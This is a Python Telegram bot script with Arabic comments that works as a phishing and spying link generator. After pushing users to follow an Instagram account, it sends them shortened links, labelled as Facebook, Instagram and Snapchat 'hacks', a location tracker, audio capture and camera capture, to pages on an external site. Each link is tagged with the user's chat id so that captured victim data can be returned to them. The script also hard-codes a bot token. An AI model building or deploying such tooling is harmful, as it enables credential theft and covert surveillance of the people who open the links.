import telebot
from telebot import types
import requests
from flask import Flask
from threading import Thread
import os
import time

# 1. إعداد السيرفر لضمان البقاء أونلاين 24 ساعة
app = Flask('')
@app.route('/')
def home(): return "M.Y.9 System Online - Developer: Abu Osayed Malkawi"

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
def keep_alive(): Thread(target=run).start()

# 2. إعدادات البوت بالتوكن الجديد
TOKEN = '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'
MY_ID = '7238206121' 
bot = telebot.TeleBot(TOKEN)

# دالة اختصار الروابط
def short(url):
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        if r.status_code == 200: return r.text
    except: pass
    return url

# 3. معالج أمر البداية (Start)
@bot.message_handler(commands=['start'])
def start(m):
    uid, name = m.chat.id, m.from_user.first_name
    
    # التحذير الأول باسم Abu Osayed Malkawi بالإنجليزية
    warning_text = f"""
⚠️ PROGRAMMING WARNING:

Dear user, to ensure system activation, you must follow the developer's official Instagram account.

📢 Developer Notice (Abu Osayed Malkawi):
Please wait for (2 minutes) until your follow is confirmed by the server and your links are generated automatically 💀🔥
    """
    
    markup = types.InlineKeyboardMarkup()
    btn_insta = types.InlineKeyboardButton("🔗 Follow Developer (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
    markup.add(btn_insta)
    
    bot.send_message(uid, warning_text, reply_markup=markup)

    # 4. تشغيل عداد الدقيقتين في الخلفية لتوليد الروابط
    def background_process(chat_id, user_name):
        time.sleep(120) # انتظار دقيقتين
        
        h = user_name.replace(" ", "_")
        base = "https://m-y-9-tech.github.io/fb/"
        p = f"?id={chat_id}&hunter={h}&dev={MY_ID}"
        
        lnks = {
            "fb": short(base+"fb.html"+p),
            "ig": short(base+"ig.html"+p),
            "sn": short(base+"snap.html"+p),
            "lc": short(base+"loc.html"+p),
            "au": short(base+"audio.html"+p),
            "c1": short(base+"cam.html"+p),
            "c2": short(base+"cam2.html"+p)
        }

        # الرسالة النهائية مع مسافات مريحة وتنسيق احترافي
        final_msg = f"""
🚀 M.Y.9 UNIFIED SYSTEM | VERIFIED ✅

👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 Facebook Hack: 
🔗 `{lnks['fb']}`

🔸 Instagram Hack: 
🔗 `{lnks['ig']}`

👻 Snapchat Hack: 
🔗 `{lnks['sn']}`

📍 Location Tracker: 
🔗 `{lnks['lc']}`

🎤 Audio Capture: 
🔗 `{lnks['au']}`

🤳 Front Camera: 
🔗 `{lnks['c1']}`

📷 Rear Camera: 
🔗 `{lnks['c2']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚖️ DISCLAIMER: The developer (Abu Osayed Malkawi) is not responsible for any illegal or harmful use.
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected Successfully
        """
        try:
            bot.send_message(chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)
        except:
            pass

    Thread(target=background_process, args=(uid, name)).start()

# 5. تشغيل البوت مع ضمان عدم التعارض
if __name__ == "__main__":
    keep_alive()
    # تنظيف أي ويب هوك قديم
    bot.remove_webhook()
    time.sleep(1)
    print("M.Y.9 System is now LIVE for Abu Osayed Malkawi...")
    # استخدام skip_pending لمسح أي رسائل قديمة وتجنب الأخطاء
    bot.infinity_polling(skip_pending=True)
